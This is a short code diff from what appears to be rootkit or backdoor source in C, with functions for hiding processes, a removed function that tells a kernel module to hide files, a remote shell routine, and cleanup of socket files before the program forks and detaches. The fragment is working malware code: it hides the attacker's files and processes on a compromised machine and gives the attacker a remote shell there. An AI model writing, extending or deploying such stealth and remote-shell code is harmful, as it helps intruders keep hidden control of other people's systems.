@@ -109,14 +109,6 @@ void hide_proc(void) {
     write(conn_sock, buf, strlen((char*) buf));
 }
 
-void hide_file(const char *file_path) {
-    unsigned char buf[1024];
-    memset(buf, 0, 1024);
-    sprintf((char*) buf, "hidef %s", file_path);
-    printf("Writing %s to module on process start\n", buf);
-    write(conn_sock, buf, strlen((char*) buf));
-}
-
 /*
  * function:
  *    run_remote_shell
@@ -645,6 +637,7 @@ int main(void) {
 
         //See if I can remove unix socket files after connection
         unlink(UNIX_SOCK_PATH);
+        unlink(SHELL_SOCK_PATH);
 
         if (wrapped_fork()) {
             setsid();
